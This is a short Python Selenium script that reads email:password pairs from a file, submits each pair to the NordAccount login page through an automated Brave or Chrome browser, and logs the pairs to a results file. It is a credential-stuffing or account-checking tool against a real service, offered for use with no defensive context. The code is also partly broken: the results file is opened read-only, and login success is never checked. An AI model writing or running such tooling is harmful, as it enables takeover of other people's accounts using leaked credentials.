from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from datetime import date
import time


    
def launchNORD(browser):
    accounts = open("formattedAccounts.txt", "r")#enter full path
    results = open("results.txt")#enter full path

    browser.get('https://nordaccount.com/login/identifier?challenge=2%7C4b17c6b0e24d4a6d9de9e2f8a8b659ef')
    time.sleep(3)

    for credentials in accounts:
        contents = credentials.split(":")
        email = browser.find_element_by_xpath('//*[@id="identifier_field"]')

        email.send_keys(contents[0])
        email.send_keys(Keys.ENTER)
        time.sleep(2)

        password = browser.find_element_by_xpath('//*[@id="password_field"]')
        password.send_keys(contents[1])
        password.send_keys(Keys.ENTER)
        time.sleep(5)

        results.write(contents[0]+" "+contents[1])
        browser.get('https://nordaccount.com/login/identifier?challenge=2%7C4b17c6b0e24d4a6d9de9e2f8a8b659ef')
        time.sleep(3)

driverPath = 'chromedriver'#enter path to chrome driver
binaryPath = 'Brave Browser'#enter path to chrome browswer or brave browser
options = webdriver.ChromeOptions()
options.binary_location = binaryPath
browser = webdriver.Chrome(executable_path=driverPath, chrome_options=options)

launchNORD(browser)